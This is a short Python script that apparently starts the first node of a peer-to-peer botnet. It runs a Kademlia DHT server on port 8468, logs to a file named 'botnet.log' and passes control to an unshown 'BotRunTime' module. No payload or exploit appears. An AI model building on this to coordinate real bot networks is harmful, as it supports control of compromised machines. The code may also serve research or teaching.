import logging
import asyncio
import sys

from run_bot import BotRunTime

from kademlia.network import Server

if len(sys.argv) != 1:
    print("Usage: python first_node.py>")
    sys.exit(1)

handler = logging.FileHandler('/tmp/botnet.log')
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)

loop = asyncio.get_event_loop()
loop.set_debug(True)

server = Server()
loop.run_until_complete(server.listen(8468))

BotRunTime(loop, server)
